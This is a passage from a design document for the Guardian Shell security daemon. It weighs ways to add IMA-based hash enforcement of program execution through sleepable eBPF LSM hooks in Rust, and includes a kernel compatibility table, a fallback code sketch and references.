| **`aya-ebpf` bpf_ima_file_hash binding** | **NOT YET AVAILABLE** | No Rust binding for this helper in aya-ebpf 0.1.x |

### What Needs to Happen

```
Option A: Wait for aya-ebpf 0.2+
  └─ Track: https://github.com/aya-rs/aya/issues
  └─ Sleepable LSM support is a known requested feature
  └─ Timeline: Unknown

Option B: Fork aya-ebpf and add support
  └─ Add `sleepable` parameter to #[lsm] proc macro
  └─ Add bpf_ima_file_hash() helper binding
  └─ Effort: Medium (well-defined scope, kernel API is stable)
  └─ Risk: Maintenance burden of maintaining a fork

Option C: Use raw BPF syscalls (bypass aya macros)
  └─ Use libbpf-rs or raw BPF syscall to load the program
  └─ Write the sleepable hook in C, compile with clang, load from Rust
  └─ Effort: High (mixed C/Rust eBPF, complex build)
  └─ Risk: Diverges from aya-based architecture
```

### Kernel Compatibility Matrix

| Distro | Kernel | IMA | BPF LSM | Sleepable LSM | bpf_ima_file_hash |
|--------|--------|-----|---------|---------------|-------------------|
| Ubuntu 20.04 | 5.4 | Yes | No | No | No |
| Ubuntu 22.04 | 5.15 | Yes | Yes | Yes | No |
| Ubuntu 22.04 HWE | 6.2+ | Yes | Yes | Yes | **Yes** |
| Ubuntu 24.04 | 6.8 | Yes | Yes | Yes | **Yes** |
| Fedora 36 | 5.17 | Yes | Yes | Yes | No |
| Fedora 37+ | 6.0+ | Yes | Yes | Yes | **Yes** |
| RHEL 9 | 5.14 | Yes | Yes | Yes | No |
| Debian 12 | 6.1 | Yes | Yes | Yes | **Yes** |
| Arch Linux | 6.x | Yes | Yes | Yes | **Yes** |

### Graceful Fallback Strategy

```rust
// Proposed: guardian/src/main.rs (at daemon startup)

// Try to attach sleepable bprm_check_security with IMA support
match load_sleepable_lsm_with_ima(&mut bpf) {
    Ok(_) => {
        info!("IMA content hashing enabled — hash-based exec enforcement active");
        populate_blocked_hashes(&mut bpf, &config)?;
    }
    Err(e) => {
        warn!("IMA content hashing unavailable ({}), falling back to path-only exec enforcement", e);
        warn!("This is normal on kernels < 5.18 or without CONFIG_IMA=y");
        // Fall back to current non-sleepable bprm_check_security
        // Path-based enforcement still works perfectly
        load_nonsleepable_lsm(&mut bpf)?;
    }
}
```

This follows Guardian Shell's existing pattern — the same graceful fallback
used when LSM isn't available at all (monitor-only mode).

---

<a name="references"></a>
## 8. References

### Kernel Documentation
- [IMA - Integrity Measurement Architecture](https://www.kernel.org/doc/html/latest/security/ima/index.html)
- [BPF LSM](https://www.kernel.org/doc/html/latest/bpf/prog_lsm.html)
- [bpf_ima_file_hash helper](https://docs.ebpf.io/linux/helper-function/bpf_ima_file_hash/)
- [Sleepable BPF programs](https://lwn.net/Articles/825415/)

### Linux Source
- `security/integrity/ima/ima_main.c` — IMA core implementation
- `security/security.c` — LSM hook dispatch
- `kernel/bpf/bpf_lsm.c` — BPF LSM attachment
- `include/uapi/linux/bpf.h` — BPF helper definitions

### Related Kernel Commits
- Linux 5.7: BPF LSM support (`security_hook_heads` exposure to BPF)
- Linux 5.11: Sleepable BPF programs for LSM hooks
- Linux 5.18: `bpf_ima_file_hash()` helper added

### aya-rs
- [aya-rs GitHub](https://github.com/aya-rs/aya) — Rust eBPF framework
- Sleepable LSM tracking: Check aya-rs issues for "sleepable" keyword

### Guardian Shell Internal Docs
- `docs/security-improvements-research.md` — Phase 7d Task #24 (content hashing)
- `docs/guardian-shell-vs-veto-comparison.md` — Path vs hash comparison with Veto
